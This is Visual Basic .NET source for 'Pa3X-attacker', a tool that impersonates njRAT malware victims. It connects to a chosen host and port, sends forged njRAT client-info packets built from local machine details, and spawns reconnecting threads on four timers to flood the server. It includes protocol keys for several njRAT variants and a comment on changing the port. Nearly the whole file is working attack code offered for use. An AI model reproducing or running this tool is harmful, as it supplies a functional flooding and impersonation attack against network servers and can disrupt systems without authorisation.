Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports System.IO
Imports System.IO.Compression
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Environment

'*] Pa3X-attacker v1.2
'*] by SEMO.Pa3x , skype: security.najaf
'*] i give you This "SRC" to let you update just the PORT. not for learning or something
'*] this client make attackes to njRAT v0.7d "Fake victimes"
'*] if you are a good programmer you can make "Multi-Hosting" option during one attack

'------------------------------------------------------------------------------------------
'*] NOTE: YOU CAN CHANGE PORT IN THIS LINE { OK.C.Connect(Form1.Host.Text, 5552) }
'------------------------------------------------------------------------------------------

'*] Last Edit: 2016/5/9
'*] Modded By HumoudMJ 2017

Public Class ATK
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Timer1.Start()
            Timer2.Start()
            Timer3.Start()
            Timer4.Start()
        Text = "njRAT Attacker [status: Attacking..]"

    End Sub


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub
    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Timer1.Stop()
        Timer2.Stop()
        Timer3.Stop()
        Timer4.Stop()
        Text = "njRAT Attacker [status: Stopped..]"
    End Sub

    Public Shared Function GTV(ByVal Name As String, ByVal df As String) As String
        Dim str As String
        Try
            str = Conversions.ToString(My.Computer.Registry.CurrentUser.OpenSubKey(("Software\Pa3X-attacker")).GetValue(Name, df))
        Catch exception1 As Exception
            str = df
        End Try
        Return str
    End Function

    Public Shared Sub STV(ByVal Name As String, ByVal v As String)
        Try
            My.Computer.Registry.CurrentUser.CreateSubKey(("Software\Pa3X-attacker")).SetValue(Name, v)
        Catch exception1 As Exception
        End Try
    End Sub


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox1.SelectedItem = "njRAT 0.7d"
        Host.Text = GTV("HOST", Host.Text)
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        If ComboBox1.SelectedItem = "njRAT 0.7d" Then
            key.Text = "|'|'|"

        ElseIf ComboBox1.SelectedItem = "njRAT Golden Edition" Then
            key.Text = "|Hassan|"


        ElseIf ComboBox1.SelectedItem = "njRAT Lime Edition" Then
            key.Text = "|NYAN|"


        ElseIf ComboBox1.SelectedItem = "njRAT Danger Edition" Then
            key.Text = "|'|'|"



        ElseIf ComboBox1.SelectedItem = "njRAT Green Edition" Then
            key.Text = "|'|'|"



        ElseIf ComboBox1.SelectedItem = "njRAT v0.11/12G" Then
            key.Text = "|'|'|"


        ElseIf ComboBox1.SelectedItem = "njRAT Platinum Edition" Then
            key.Text = "|Ghost|"

        ElseIf ComboBox1.SelectedItem = "Dangerous RAT 2020" Then
            key.Text = "|-F-|"

        ElseIf ComboBox1.SelectedItem = "njRAT 0.7d (Modded)" Then
            key.Text = "Y262SUCZ4UJJ"
        End If





    End Sub
End Class

Public Class OK

    Public Shared Function BS(ByRef B As Byte()) As String
        Return Encoding.UTF8.GetString(B)
    End Function

    Public Shared Function Cam() As Boolean
        Try
            Dim num As Integer = 0
            Do
                Dim lpszVer As String = Nothing
                If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                    Return True
                End If
                num += 1
            Loop While (num <= 4)
        Catch exception1 As Exception
        End Try
        Return False
    End Function

    <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
    End Function

    Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
        If (F1.Name.ToLower = F2.Name.ToLower) Then
            Dim directory As DirectoryInfo = F1.Directory
            Dim parent As DirectoryInfo = F2.Directory
            Do
                If (directory.Name.ToLower <> parent.Name.ToLower) Then
                    Return False
                End If
                directory = directory.Parent
                parent = parent.Parent
                If ((directory Is Nothing) And (parent Is Nothing)) Then
                    Return True
                End If
                If (directory Is Nothing) Then
                    Return False
                End If
            Loop While (Not parent Is Nothing)
        End If
        Return False
    End Function
    Public Shared Function connect() As Boolean
        OK.Cn = False
        Thread.Sleep(&H7D0)
        Dim lO As FileInfo = OK.LO
        SyncLock lO
            Try
                If (Not OK.C Is Nothing) Then
                    Try
                        OK.C.Close()
                        OK.C = Nothing
                    Catch exception1 As Exception
                    End Try
                End If
                Try
                    OK.MeM.Dispose()
                Catch exception6 As Exception

                End Try
            Catch exception7 As Exception

            End Try
            Try
                OK.MeM = New MemoryStream
                OK.C = New TcpClient
                OK.C.ReceiveBufferSize = &H32000
                OK.C.SendBufferSize = &H32000
                OK.C.Client.SendTimeout = &H2710
                OK.C.Client.ReceiveTimeout = &H2710
                OK.C.Connect(ATK.Host.Text, ATK.port.Text)
                OK.Cn = True
                OK.Send(OK.inf)
                Try
                    OK.Send(("inf" & OK.Y))
                Catch exception8 As Exception
                End Try
            Catch exception9 As Exception
            End Try
        End SyncLock
        Return OK.Cn
    End Function

    Public Shared Function DEB(ByRef s As String) As String
        Return OK.BS(Convert.FromBase64String(s))
    End Function


    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(OK.SB(s))
    End Function

    <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    End Function

    Public Shared Function HWD() As String
        Dim str As String
        Try
            Dim num As Integer
            Dim lpVolumeNameBuffer As String = Nothing
            Dim lpMaximumComponentLength As Integer = 0
            Dim lpFileSystemFlags As Integer = 0
            Dim lpFileSystemNameBuffer As String = Nothing
            OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
            str = Conversion.Hex(num)
        Catch exception1 As Exception
            str = "ERR"
        End Try
        Return str
    End Function

    Public Shared Function inf() As String
        Dim str2 As String = ("ll" & OK.Y)
        Try
            str2 = (str2 & ENB(DEB("U0VNTy5QYTN4") & "_" & OK.HWD) & OK.Y)
        Catch exception1 As Exception
            str2 = (str2 & OK.ENB(OK.HWD) & OK.Y)
        End Try
        Try
            str2 = (str2 & Environment.MachineName & OK.Y)
        Catch exception9 As Exception
            str2 = (str2 & "??" & OK.Y)
        End Try
        Try
            str2 = (str2 & Environment.UserName & OK.Y)
        Catch exception10 As Exception
            str2 = (str2 & "??" & OK.Y)
        End Try
        Try
            str2 = (str2 & OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") & OK.Y)
        Catch exception11 As Exception
            str2 = (str2 & "??-??-??" & OK.Y)
        End Try
        str2 = (str2 & "" & OK.Y)
        Try
            str2 = (str2 & OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
        Catch exception12 As Exception
            str2 = (str2 & "??")
        End Try
        str2 = (str2 & "SP")
        Try
            Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
            If (strArray.Length = 1) Then
                str2 = (str2 & "0")
            End If
            str2 = (str2 & strArray((strArray.Length - 1)))
        Catch exception13 As Exception
            str2 = (str2 & "0")
        End Try
        Try
            If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                str2 = (str2 & " x64" & OK.Y)
            Else
                str2 = (str2 & " x86" & OK.Y)
            End If
        Catch exception14 As Exception
            str2 = (str2 & OK.Y)
        End Try
        If OK.Cam Then
            str2 = (str2 & "Yes" & OK.Y)
        Else
            str2 = (str2 & "No" & OK.Y)
        End If
        str2 = (((str2 & OK.VR & OK.Y) & "4ms" & OK.Y) & OK.Y)
        Return (str2)
    End Function


    Public Shared Sub RC()

        If (Not OK.C Is Nothing) Then
            Dim num As Long = -1
            Dim num2 As Integer = 0
            Try
Label_001B:
                num2 += 1
                If (num2 = 10) Then
                    num2 = 0
                    Thread.Sleep(1)
                End If
                If Not OK.Cn Then
                    GoTo Label_01C1
                End If
                If (OK.C.Available < 1) Then
                    OK.C.Client.Poll(-1, SelectMode.SelectRead)
                End If
Label_0057:
                If (OK.C.Available > 0) Then
                    If (num = -1) Then
                        Dim str As String = ""
                        Do While True
                            Dim charCode As Integer = OK.C.GetStream.ReadByte
                            Select Case charCode
                                Case -1
                                    GoTo Label_01C1
                                Case 0
                                    num = Conversions.ToLong(str)
                                    str = ""
                                    If (num = 0) Then
                                        OK.Send("")
                                        num = -1
                                    End If
                                    If (OK.C.Available <= 0) Then
                                        GoTo Label_001B
                                    End If
                                    GoTo Label_0057
                            End Select
                            str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                        Loop
                    End If
                    OK.b = New Byte((OK.C.Available + 1) - 1) {}
                    Dim num5 As Long = (num - OK.MeM.Length)
                    If (OK.b.Length > num5) Then
                        OK.b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                    End If
                    Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                    OK.MeM.Write(OK.b, 0, count)
                    GoTo Label_001B
                End If
            Catch exception1 As Exception

            End Try
        End If
Label_01C1:
        OK.Cn = False
        If Not OK.connect Then
            GoTo Label_01C1
        End If
        OK.Cn = True
    End Sub

    Public Shared Function SB(ByRef S As String) As Byte()
        Return Encoding.UTF8.GetBytes(S)
    End Function

    Public Shared Function Send(ByVal S As String) As Boolean
        Return OK.Sendb(OK.SB(S))
    End Function

    Public Shared Function Sendb(ByVal b As Byte()) As Boolean
        If Not OK.Cn Then
            Return False
        End If
        Try
            Dim lO As FileInfo = OK.LO
            SyncLock lO
                If Not OK.Cn Then
                    Return False
                End If
                Dim stream As New MemoryStream
                Dim length As Integer = b.Length
                Dim buffer As Byte() = OK.SB((length.ToString & ChrW(0)))
                stream.Write(buffer, 0, buffer.Length)
                stream.Write(b, 0, b.Length)
                OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
            End SyncLock
        Catch exception1 As Exception
            Try
                If OK.Cn Then
                    OK.Cn = False
                    OK.C.Close()
                End If
            Catch exception3 As Exception
            End Try
        End Try
        Return OK.Cn
    End Function


    Public Shared Function ZIP(ByVal B As Byte()) As Byte()
        Dim stream2 As New MemoryStream(B)
        Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
        Dim buffer2 As Byte() = New Byte(4 - 1) {}
        stream2.Position = (stream2.Length - 5)
        stream2.Read(buffer2, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
        stream2.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        stream.Read(array, 0, count)
        stream.Dispose()
        stream2.Dispose()
        Return array
    End Function

    Private Shared b As Byte() = New Byte(&H1401 - 1) {}
    Public Shared C As TcpClient = Nothing
    Public Shared Cn As Boolean = False
    Public Shared F As Computer = New Computer
    Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly.Location)
    Private Shared MeM As MemoryStream = New MemoryStream
    Public Shared PLG As Object = Nothing
    Public Shared VR As String = "0.7d"
    Public Shared Y As String = ATK.key.Text
End Class